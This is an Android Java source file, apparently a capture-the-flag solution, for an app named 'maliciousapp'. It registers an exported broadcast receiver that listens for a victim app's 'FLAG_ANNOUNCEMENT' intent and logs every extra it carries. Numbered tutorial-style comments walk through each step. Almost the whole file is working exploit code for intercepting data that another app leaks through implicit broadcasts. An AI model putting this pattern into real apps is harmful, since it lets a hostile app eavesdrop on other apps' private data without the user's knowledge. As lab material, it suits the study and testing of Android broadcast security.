package com.example.maliciousapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.util.Objects;

public class MainActivity extends AppCompatActivity {

    static private final String TAG = "CTF";

    // 1. create the class for the receiver

    public static class MyBroadcastReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {

            // 2. check for the action we want to listen to -> victim.app.FLAG_ANNOUNCEMENT
            if (Objects.equals(intent.getAction(), "victim.app.FLAG_ANNOUNCEMENT")) {

                //3. bundle everything together
                Bundle extras = intent.getExtras();
                assert extras != null;
                for (String key : extras.keySet()) {
                    Log.d(TAG, "Key: " + key + " Value: " + extras.get(key));
                }

            }

        }
    }

    // 4. Create the instance
    MyBroadcastReceiver myBroadcastReceiver = new MyBroadcastReceiver();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 5. register the receiver with the intent filter
        IntentFilter filter = new IntentFilter("victim.app.FLAG_ANNOUNCEMENT");

        boolean listenToBroadcastsFromOtherApps = true;
        int receiverFlags = listenToBroadcastsFromOtherApps
                ? ContextCompat.RECEIVER_EXPORTED
                : ContextCompat.RECEIVER_NOT_EXPORTED;

        // context -> this
        // ContextCompat.registerReceiver(context, myBroadcastReceiver, filter, receiverFlags);
        ContextCompat.registerReceiver(this, myBroadcastReceiver, filter, receiverFlags);


    }

    // 6. unregister the receiver, is not in the manual but good practice
    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(myBroadcastReceiver);
    }
}